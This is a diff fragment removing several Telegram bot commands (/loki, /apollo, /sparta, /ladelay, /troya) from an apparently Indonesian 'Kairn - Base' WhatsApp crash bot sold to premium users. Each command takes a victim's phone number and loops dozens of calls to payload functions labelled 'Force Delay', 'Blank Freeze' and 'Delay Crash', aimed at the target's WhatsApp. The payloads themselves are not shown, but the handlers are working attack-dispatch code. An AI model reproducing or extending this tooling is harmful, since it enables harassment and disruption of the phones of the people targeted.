-                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
-                ]
-            }
-        });
-    }
-
-    if (sessions.size === 0) {
-        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
-    }
-
-    const sent = await bot.sendVideo(chatId, randomVideo, {
-        caption: `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Force 𝖣𝖾𝗅𝖺𝗒
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-`,
-        parse_mode: "HTML"
-    });
-
-    try {
-        await sleep(1000);
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Force 𝖣𝖾𝗅𝖺𝗒
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-
-        for (let i = 0; i < 20; i++) {
-            await sockFcInvis(sock, target);
-            await sleep(500);
-            await sockFcInvis(sock, target);
-            await sleep(500);
-            await sockCarouselV1(sock, target);
-            await sleep(500);
-            await sockCarouselV1(sock, target);
-        }
-
-        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Force`));
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Force 𝖣𝖾𝗅𝖺𝗒
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-    } catch (err) {
-        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
-    }
-});
-
-bot.onText(/\/loki(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-
-    // Validasi format
-    if (!match || !match[1]) {
-        return bot.sendMessage(chatId, 
-            `❌ *Format salah!*\n\nGunakan: /loki [nomor]\nContoh: /loki 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const targetNumber = match[1];
-    const randomVideo = getRandomVideo();
-    const date = getCurrentDate();
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-
-    // Validasi panjang nomor
-    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
-        return bot.sendMessage(chatId, 
-            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /loki 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const target = `${formattedNumber}@s.whatsapp.net`;
-
-    // Periksa status premium user
-    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
-
-    if (!isUserPremium) {
-        return bot.sendVideo(chatId, randomVideo, {
-            caption: `
-<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
-❌ Akses ditolak. Fitur ini hanya untuk user premium.
-`,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
-                ]
-            }
-        });
-    }
-
-    if (sessions.size === 0) {
-        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
-    }
-
-    const sent = await bot.sendVideo(chatId, randomVideo, {
-        caption: `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Blank Andro
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-`,
-        parse_mode: "HTML"
-    });
-
-    try {
-        await sleep(1000);
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Blank Andro
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-
-        for (let i = 0; i < 20; i++) {
-            await BlankXFrezeeInfinity(sock, target);
-            await sleep(500);
-            await BlankXFrezeeInfinity(sock, target);
-        }
-
-        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Blank Andro`));
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Blank Andro
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-    } catch (err) {
-        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
-    }
-});
-
-bot.onText(/\/apollo(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-
-    // Validasi format
-    if (!match || !match[1]) {
-        return bot.sendMessage(chatId, 
-            `❌ *Format salah!*\n\nGunakan: /apollo [nomor]\nContoh: /apollo 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const targetNumber = match[1];
-    const randomVideo = getRandomVideo();
-    const date = getCurrentDate();
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-
-    // Validasi panjang nomor
-    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
-        return bot.sendMessage(chatId, 
-            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /apollo 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const target = `${formattedNumber}@s.whatsapp.net`;
-
-    // Periksa status premium user
-    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
-
-    if (!isUserPremium) {
-        return bot.sendVideo(chatId, randomVideo, {
-            caption: `
-<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
-❌ Akses ditolak. Fitur ini hanya untuk user premium.
-`,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
-                ]
-            }
-        });
-    }
-
-    if (sessions.size === 0) {
-        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
-    }
-
-    const sent = await bot.sendVideo(chatId, randomVideo, {
-        caption: `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Blank Freeze
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-`,
-        parse_mode: "HTML"
-    });
-
-    try {
-        await sleep(1000);
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Blank Freeze
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-
-        for (let i = 0; i < 40; i++) {
-            await LocationSilent(sock, target);
-            await sleep(500);
-            await LocationSilent(sock, target);
-            await sleep(500);
-            await BlankXFrezeeInfinity(sock, target);
-        }
-
-        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Blank Freeze`));
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Blank Freeze
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-    } catch (err) {
-        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
-    }
-});
-
-bot.onText(/\/sparta(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-
-    // Validasi format
-    if (!match || !match[1]) {
-        return bot.sendMessage(chatId, 
-            `❌ *Format salah!*\n\nGunakan: /sparta [nomor]\nContoh: /sparta 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const targetNumber = match[1];
-    const randomVideo = getRandomVideo();
-    const date = getCurrentDate();
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-
-    // Validasi panjang nomor
-    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
-        return bot.sendMessage(chatId, 
-            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /sparta 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const target = `${formattedNumber}@s.whatsapp.net`;
-
-    // Periksa status premium user
-    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
-
-    if (!isUserPremium) {
-        return bot.sendVideo(chatId, randomVideo, {
-            caption: `
-<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
-❌ Akses ditolak. Fitur ini hanya untuk user premium.
-`,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
-                ]
-            }
-        });
-    }
-
-    if (sessions.size === 0) {
-        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
-    }
-
-    const sent = await bot.sendVideo(chatId, randomVideo, {
-        caption: `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Soft Delay
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-`,
-        parse_mode: "HTML"
-    });
-
-    try {
-        await sleep(1000);
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Soft Delay
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-
-        for (let i = 0; i < 25; i++) {
-            await TheKingS9(sock, target);
-            await sleep(500);
-            await TheKingS9(sock, target);
-            await sleep(500);
-            await TheKingS9(sock, target);
-        }
-
-        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Soft Delay`));
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Soft Delay
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-    } catch (err) {
-        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
-    }
-});
-
-bot.onText(/\/ladelay(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-
-    // Validasi format
-    if (!match || !match[1]) {
-        return bot.sendMessage(chatId, 
-            `❌ *Format salah!*\n\nGunakan: /ladelay [nomor]\nContoh: /ladelay 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const targetNumber = match[1];
-    const randomVideo = getRandomVideo();
-    const date = getCurrentDate();
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-
-    // Validasi panjang nomor
-    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
-        return bot.sendMessage(chatId, 
-            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /ladelay 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const target = `${formattedNumber}@s.whatsapp.net`;
-
-    // Periksa status premium user
-    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
-
-    if (!isUserPremium) {
-        return bot.sendVideo(chatId, randomVideo, {
-            caption: `
-<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
-❌ Akses ditolak. Fitur ini hanya untuk user premium.
-`,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
-                ]
-            }
-        });
-    }
-
-    if (sessions.size === 0) {
-        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
-    }
-
-    const sent = await bot.sendVideo(chatId, randomVideo, {
-        caption: `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Delay Crash
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-`,
-        parse_mode: "HTML"
-    });
-
-    try {
-        await sleep(1000);
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Delay Crash
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-
-        for (let i = 0; i < 25; i++) {
-            await sockCarouselV1(sock, target);
-            await sleep(500);
-            await sockCarouselV1(sock, target);
-            await sleep(500);
-            await sockCarouselV1(sock, target);
-            await sleep(500);
-        }
-
-        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Delay Crash`));
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Delay Crash
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-    } catch (err) {
-        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
-    }
-});
-
-bot.onText(/\/troya(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-
-    // Validasi format
-    if (!match || !match[1]) {
-        return bot.sendMessage(chatId, 
-            `❌ *Format salah!*\n\nGunakan: /troya [nomor]\nContoh: /troya 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const targetNumber = match[1];
-    const randomVideo = getRandomVideo();
-    const date = getCurrentDate();
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-
-    // Validasi panjang nomor
-    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
-        return bot.sendMessage(chatId, 
-            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /troya 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    const target = `${formattedNumber}@s.whatsapp.net`;
-
-    // Periksa status premium user
-    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
-
-    if (!isUserPremium) {
-        return bot.sendVideo(chatId, randomVideo, {
-            caption: `
-<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
-❌ Akses ditolak. Fitur ini hanya untuk user premium.
-`,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
-                ]
-            }
-        });
-    }
-
-    if (sessions.size === 0) {
-        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
-    }
-
-    const sent = await bot.sendVideo(chatId, randomVideo, {
-        caption: `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Delay Hard
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-`,
-        parse_mode: "HTML"
-    });
-
-    try {
-        await sleep(1000);
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Delay Hard
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-
-        for (let i = 0; i < 35; i++) {
-            await TheKingS9(sock, target);
-            await sleep(500);
-            await TheKingS9(sock, target);
-            await sleep(500);
-            await TheKingS9(sock, target);
-            await sleep(500);
-            await TheKingS9(sock, target);
-        }
-
-        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Soft Delay`));
-
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖳𝗒𝗉𝖾 : Delay Hard
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: chatId,
-                message_id: sent.message_id,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
-                    ]
-                }
-            }
-        );
-    } catch (err) {
-        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
-    }
-});
 
 ////Pul Update
 bot.onText(/^\/reloadcore$/, async (msg) => {
